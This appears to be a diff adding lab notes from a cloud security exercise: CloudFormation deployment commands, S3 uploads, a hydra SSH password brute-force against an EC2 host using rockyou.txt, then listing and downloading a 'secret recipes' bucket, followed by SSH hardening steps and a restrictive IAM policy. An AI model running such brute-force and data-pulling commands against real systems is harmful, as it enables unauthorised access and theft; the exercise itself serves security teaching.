@@ -1,0 +1,57 @@
+
+aws cloudformation create-stack --region us-east-1 --stack-name c3-s3-1 --template-body file://starter/c3-s3.yml
+
+aws cloudformation create-stack --region us-east-1 --stack-name c3-vpc --template-body file://starter/c3-vpc.yml
+
+aws cloudformation create-stack --region us-east-1 --stack-name c3-app --template-body file://starter/c3-app.yml --parameters ParameterKey=KeyPair,ParameterValue=loinlt1 --capabilities CAPABILITY_IAM
+
+
+
+aws s3 cp free_recipe.txt s3://cand-c3-free-recipes-524300083265/ --region us-east-1
+aws s3 cp secret_recipe.txt s3://cand-c3-secret-recipes-524300083265/ --region us-east-1
+
+Test
+http://c1-web-service-alb-93768515.us-east-1.elb.amazonaws.com/free_recipe
+
+Ex3:
+
+ssh -i "loinlt1.pem" ubuntu@ec2-54-92-181-225.compute-1.amazonaws.com
+
+hydra -l ubuntu -P rockyou.txt ssh://ec2-23-22-211-41.compute-1.amazonaws.com
+
+# view the files in the secret recipes bucket
+aws s3 ls  s3://cand-c3-secret-recipes-524300083265/ --region us-east-1
+ 
+# download the files
+aws s3 cp s3://cand-c3-secret-recipes-524300083265/secret_recipe.txt  .  --region us-east-1
+
+# view contents of the file
+cat secret_recipe.txt
+
+Ex4
+ssh -i "loinlt1.pem" ubuntu@ec2-23-22-211-41.compute-1.amazonaws.com
+sudo vi /etc/ssh/sshd_config
+sudo service ssh restart
+
+# view the files in the secret recipes bucket
+aws s3 ls s3://cand-c3-secret-recipes-524300083265/ --region us-east-1
+ 
+# download the files
+aws s3 cp s3://cand-c3-secret-recipes-524300083265/secret_recipe.txt  .  --region us-east-1
+
+
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Action": [
+                "s3:GetObject",
+                "s3:ListBucket"
+            ],
+            "Resource": [
+                "arn:aws:s3:::cand-c3-free-recipes-524300083265"
+            ]
+        }
+    ]
+}
